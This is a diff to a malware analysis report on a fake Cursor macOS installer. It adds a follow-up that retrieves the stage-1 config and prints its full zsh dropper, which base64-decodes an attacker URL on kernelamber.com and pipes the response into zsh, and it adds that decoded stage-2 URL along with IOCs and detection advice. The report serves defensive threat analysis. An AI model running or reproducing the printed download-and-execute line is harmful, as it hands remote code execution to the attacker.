@@ -102,7 +102,31 @@ The host and URL are never present as plain strings in the binary (confirmed by 
 
 **Reconstructed URL:** `https://raw.githubusercontent.com/mgothiclove/subdata/main/submod.cfg`
 
-This was recovered by mapping Swift `_SmallString` literal encoding (content bytes + `0xE0|length` discriminator byte) out of the decompiled constant assignments; the decoder script is included alongside this report (`Cursor-darwin-universal.dmg_decode_fragments.py`). The fragmentation is a deliberate anti-string-scanning technique — abusing GitHub's raw-content CDN as a free, reputable-looking hosting point for a mutable second-stage config/payload. This URL was **not fetched** during this analysis (no interaction with the live endpoint); its content, if any, may change or be removed by the operator at any time and was not retrieved.
+This was recovered by mapping Swift `_SmallString` literal encoding (content bytes + `0xE0|length` discriminator byte) out of the decompiled constant assignments; the decoder script is included alongside this report (`Cursor-darwin-universal.dmg_decode_fragments.py`). The fragmentation is a deliberate anti-string-scanning technique — abusing GitHub's raw-content CDN as a free, reputable-looking hosting point for a mutable second-stage config/payload.
+
+### 4.1 Follow-up: live retrieval of `submod.cfg` (2026-07-28)
+
+The endpoint was fetched read-only from the REMnux analysis host (`curl`, no execution) to determine the next stage. It is **live**: HTTP 200, 184 bytes, `Content-Type: text/plain`.
+
+Full contents of `submod.cfg`:
+
+```zsh
+#!/bin/zsh
+
+curl -s $(echo "aHR0cHM6Ly9rZXJuZWxhbWJlci5jb20vY3VybC80ODc1ODM5NjE3YjM1MDRhOWQzYWJhZjg2ZWMzZDFmNzMyZTMwOGJiMmIzNzM0YWNjMzYyMDhlMzU0MDBhZmQ5" | openssl base64 -d -A) | zsh
+```
+
+This confirms the `validate()` prefix check in §3 (`#!/bin/zsh`) and the file's role: it is **not itself the second-stage payload** — it is a redirector. It base64-decodes an embedded string to obtain a URL, then pipes whatever that URL returns directly into `zsh` (`curl ... | zsh`), i.e. blind remote code execution with no signature or integrity check on the fetched content.
+
+Decoding the embedded base64 string yields the **true stage-2 URL**, hosted on attacker-controlled infrastructure — **not** GitHub:
+
+```
+https://kernelamber.com/curl/4875839617b3504a9d3abaf86ec3d1f732e308bb2b3734acc36208e35400afd9
+```
+
+The path segment is a 64-character hex string (SHA256-shaped), consistent with a hash-keyed payload store — likely a per-build or per-campaign artifact identifier on the attacker's own delivery backend.
+
+**Stage-2 payload could not be retrieved.** `kernelamber.com` sits behind Cloudflare; two fetch attempts from this REMnux host returned inconsistent errors — first `HTTP 520` (Cloudflare "origin returned an unknown error"), then `HTTP 403` with Cloudflare block body `error code: 1010` (Cloudflare's IP/ASN-reputation block page). This matches a previously documented limitation of this analysis environment ([[reference_remnux_network_pivot_options]]): Cloudflare blocks this vantage point (and its Tor pivot) with 403/1010. No further vantage point was available to retrieve the stage-2 content, so its capability is unknown — only the delivery mechanism and infrastructure were confirmed.
 
 ## 5. Attack Chain
 
@@ -112,21 +136,25 @@ This was recovered by mapping Swift `_SmallString` literal encoding (content byt
 4. The launched binary (`auralis`) runs `isEnvironmentAllowed()` to check for hostile/analysis environment indicators.
 5. `ExecutionGate.acquire()` takes an exclusive lock to prevent concurrent/repeated execution.
 6. `fetchWithRetry()` requests `https://raw.githubusercontent.com/mgothiclove/subdata/main/submod.cfg` over an ephemeral HTTPS session with retry/backoff.
-7. `validate()` checks the response is well-formed text with an expected prefix and minimum size.
-8. `writeTemporary()` drops the validated payload to a uniquely named, executable (`0755`) file in the temp directory.
-9. `execute()` launches the dropped file as a child process and waits for it to finish.
-10. The dropped file is deleted (`removeItemAtURL`) and the lock is released — leaving no persistent artifact from this stage.
-11. No Cursor editor UI or functionality is ever shown to the victim.
+7. `validate()` checks the response is well-formed text with an expected prefix (`#!/bin/zsh`) and minimum size.
+8. `writeTemporary()` drops the validated `submod.cfg` zsh script to a uniquely named, executable (`0755`) file in the temp directory.
+9. `execute()` launches the dropped script as a child process and waits for it to finish.
+10. **The dropped script runs** (confirmed by live retrieval, §4.1): it decodes an embedded base64 string to `https://kernelamber.com/curl/<64-hex-char id>` and pipes that URL's response directly into `zsh` — a second, attacker-controlled download-and-execute hop with no integrity checking, fetching whatever the operator currently hosts there.
+11. The stage-1 script file is deleted (`removeItemAtURL`) by `auralis` and its execution lock is released — leaving no persistent artifact from that stage. (The stage-2 fetch happens inside the spawned `zsh` process itself, outside `auralis`'s own cleanup logic.)
+12. No Cursor editor UI or functionality is ever shown to the victim at any point.
 
 ## 6. IOCs
 
 ### Network (defanged)
-- `raw[.]githubusercontent[.]com` — abused legitimate GitHub CDN host, used as the fetch endpoint (built at runtime from fragmented literals, not a plaintext string in the binary)
-- `hxxps[://]raw[.]githubusercontent[.]com/mgothiclove/subdata/main/submod[.]cfg` — reconstructed full URL (not fetched/verified live during this analysis)
+- `raw[.]githubusercontent[.]com` — abused legitimate GitHub CDN host, used as the stage-1 fetch endpoint (built at runtime from fragmented literals, not a plaintext string in the binary)
+- `hxxps[://]raw[.]githubusercontent[.]com/mgothiclove/subdata/main/submod[.]cfg` — stage-1 config/dropper script, **confirmed live** (HTTP 200) during this analysis
+- `kernelamber[.]com` — **primary attacker-controlled C2/payload host** (Cloudflare-fronted), decoded from a base64 string embedded in the stage-1 script
+- `hxxps[://]kernelamber[.]com/curl/4875839617b3504a9d3abaf86ec3d1f732e308bb2b3734acc36208e35400afd9` — stage-2 payload URL; confirmed to resolve via Cloudflare but content could not be retrieved from this analysis vantage point (blocked, see §4.1)
 
 ### Filesystem
 - `Cursor.app/Contents/MacOS/auralis` — main payload, SHA256 `c8d571a9a03475fc3d85da44fa29f82c4c2f0f2955651aba138df2465f08e7f7`
-- `NSTemporaryDirectory()/<UUID>` — transient dropped/executed second-stage file, self-deletes after execution (no fixed name to pin down)
+- `NSTemporaryDirectory()/<UUID>` — transient dropped-and-executed stage-1 script (`submod.cfg` content), self-deletes after execution (no fixed name to pin down)
+- `submod.cfg` (stage-1 dropper script, 184 bytes) — SHA256 `c47ea97e7f0628242c6180aaf5dc7462ae6eed52a12937291f980060692226da`
 
 ### Code signing
 - `Developer ID Application: Todor Madjarov (5A8SW7S333)` — Apple Developer ID used to sign the malicious `auralis` binary
@@ -149,8 +177,8 @@ Not applicable. The runtime-emulation tooling available in this environment (spe
 ## 9. Analyst Notes
 
 - **`license.pdf` (43 MB) is a genuine, non-malicious PDF** — its `com.apple.metadata:kMDItemWhereFroms` extended attribute records it was downloaded from a public Nextcloud share at `nextcloud.documentfoundation.org` (LibreOffice/TDF's own file-sharing instance). It contains ordinary embedded photos and is almost certainly repurposed by the attacker purely as **filler to inflate the DMG to a plausible installer size** (~29 MB total vs. a 300 KB payload) — it is not part of the attack logic and carries no IOC value of its own beyond confirming operator tradecraft.
-- The `validate()` function expects a **UTF-8 text response with a specific prefix**, meaning the second-stage artifact fetched from GitHub is likely a script, base64-encoded blob, or config — not a raw Mach-O — consistent with `Config.maxPayloadSize` and `Config.userAgent` static fields seen in the symbol table suggesting a deliberately small, constrained fetch.
+- The `validate()` function's expectation of a **UTF-8 text response with a specific prefix** was confirmed correct by live retrieval (§4.1): the stage-1 artifact is a `#!/bin/zsh` script, not a raw Mach-O, consistent with `Config.maxPayloadSize` and `Config.userAgent` static fields seen in the symbol table suggesting a deliberately small, constrained fetch.
 - The `isEnvironmentAllowed()` gate could not be fully reverse engineered to the specific list of blocked/required environment variable names within the time invested (it performs a hashed dictionary-membership check rather than a simple string comparison); a deeper static effort or live-environment fuzzing could recover the exact gating keys.
-- The reconstructed GitHub path (`mgothiclove/subdata/main/submod.cfg`) was **not fetched** — its live content is unknown and may have changed since this DMG was built. Any follow-up should treat that URL as a hostile-infrastructure lead only, and fetch it from an isolated/monitored environment if further investigation is warranted.
+- **Follow-up (2026-07-28): stage-1 confirmed live, stage-2 infrastructure identified but content unreachable.** `submod.cfg` was fetched read-only and is a redirector, not the payload itself — it decodes an embedded base64 string to `https://kernelamber.com/curl/<64-hex id>` and pipes that response into `zsh` with no integrity checking (§4.1). This means the operator can swap the actual second-stage capability at will without ever touching the GitHub-hosted stage-1 script, and different victims/time windows could plausibly receive different stage-2 payloads from the same URL. `kernelamber.com` is Cloudflare-fronted and blocked this analysis host's egress (520 then 403/`error code: 1010`), consistent with the documented Cloudflare/Tor limitation in this environment ([[reference_remnux_network_pivot_options]]) — stage-2 capability remains undetermined. Recommend re-attempting retrieval from a vantage point with clean IP reputation (e.g. a residential or unflagged commercial egress) if deeper attribution is needed.
 - capa was attempted against the universal Mach-O but the installed version rejected the file format outright ("Input file does not appear to be a supported file") — no capa capability data available for this sample.
-- Recommend blocking/monitoring outbound requests from developer workstations to `raw.githubusercontent.com/mgothiclove/*` and flagging any macOS app bundle whose `CFBundleExecutable`/`CFBundleIdentifier` disagree with its enclosing folder/DMG name, which is the most durable detection signal here (independent of any single hash/URL that the operator can trivially rotate).
+- Recommend blocking/monitoring outbound requests from developer workstations to both `raw.githubusercontent.com/mgothiclove/*` **and** `kernelamber.com`, and flagging any macOS app bundle whose `CFBundleExecutable`/`CFBundleIdentifier` disagree with its enclosing folder/DMG name — the bundle-identity mismatch is the most durable detection signal here, independent of any single hash/URL/domain that the operator can trivially rotate (the GitHub→kernelamber.com redirect chain is itself evidence of exactly that kind of rotation-by-design).
